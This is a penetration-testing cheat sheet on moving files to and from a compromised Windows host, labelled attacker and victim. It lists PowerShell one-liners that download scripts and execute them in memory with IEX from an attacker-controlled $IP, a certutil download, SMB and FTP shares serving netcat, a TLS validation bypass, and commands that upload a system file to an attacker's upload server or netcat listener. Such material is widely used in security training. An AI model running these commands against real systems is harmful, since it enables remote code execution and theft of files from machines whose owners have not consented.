---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Windows

## From ATTACKER to TARGET

### Powershell base64 download

```powershell
# Write base64 into file
[IO.File]::WriteAllBytes("C:\Users\Public\test.txt", [Convert]::FromBase64String("aGVsbG8sd29ybGQK"))
```

### Powershell download

```powershell
# Download into disk
(New-Object Net.WebClient).DownloadFile('http://$IP/test.txt','C:\Users\Public\test.txt')

# Download into disk (without blocking the calling thread)
(New-Object Net.WebClient).DownloadFileAsync('http://$IP/test.txt','test.txt')

# Download into disk (PowerShell 3.0+)
Invoke-WebRequest http://$IP/test.txt -OutFile test.txt

# Download into disk (PowerShell 3.0+)
wget -Uri http://$IP/test.txt -OutFile test.txt

# Download into memory
IEX(New-Object Net.WebClient).DownloadString('http://$IP/test.ps1')

# Download into memory
(New-Object Net.WebClient).DownloadString('http://$IP/test.ps1') | IEX

# Download into memory (PowerShell 3.0+)
IEX(iwr 'http://$IP/test.ps1')

# Download into memory (PowerShell 3.0+)
Invoke-WebRequest http://$IP/test.ps1 -UseBasicParsing | IEX

# Bypass SSL/TLS error
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### LOLBins download

```bash
# Download into disk (https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
certutil.exe -urlcache -f http://$IP/test.txt test.txt
```

### SMB download

```bash
# ATTACKER 
# Create SMB share NO AUTHENTICATION
sudo smbserver.py <share> -smb2support /tmp/share
# VICTIM
copy \\$IP\<share>\nc.exe

# ATTACKER
# Create SMB share AUTHENTICATION
sudo smbserver.py <share> -smb2support /tmp/share -username admin -password password123
# VICTIM
net use n: \\$IP\<share> /user:admin password123
copy n:\nc.exe
```

### FTP download

```powershell
# ATTACKER
# Start the FTP server
python3 -m pyftpdlib --port 21

# VICTIM
# Download into disk
(New-Object Net.WebClient).DownloadFile('ftp://$IP/test.txt','C:\Users\Public\test.txt')

# Download into memory
IEX(New-Object Net.WebClient).DownloadString('ftp://$IP/test.ps1')
```

## From TARGET to ATTACKER

### Powershell base64 upload

```powershell
# Convert into base64
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

### Powershell upload

```powershell
# ATTACKER
# Start the UPLOAD server
python3 -m uploadserver

# VICTIM
# Import ps1 file
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

# Upload the file
Invoke-FileUpload -Uri http://$IP:8000/upload -File C:\Windows\system32\drivers\etc\hosts
```

### Powershell base64 web upload

```powershell
# ATTACKER
# Start the NC
nc -lnvp 8000

# VICTIM
# Send base64 to NC
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\system32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://$IP:8000/ -Method POST -Body $b64
```
